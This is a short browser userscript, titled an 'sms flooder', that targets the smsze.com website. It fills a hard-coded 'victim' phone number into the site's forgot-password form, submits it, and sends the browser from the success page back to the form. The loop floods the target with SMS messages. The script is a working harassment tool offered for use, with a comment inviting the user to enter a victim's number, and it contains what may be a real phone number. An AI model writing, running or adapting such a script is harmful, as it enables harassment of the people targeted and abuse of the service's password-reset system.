// ==UserScript==
// @name          Anonymous SMSZE.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*smsze.com/*
// ==/UserScript==

var victim=7250214431; //Enter victims number here

if(document.location=="http://www.smsze.com/forgetpassword.php"||document.location=="http://www.smsze.com/forgetpassword.php")
{
document.getElementsByName("mobileno")[0].value=victim;
document.forms[1].submit();
}

if(document.location=="http://www.smsze.com/successpass.php")
document.location="http://www.smsze.com/forgetpassword.php"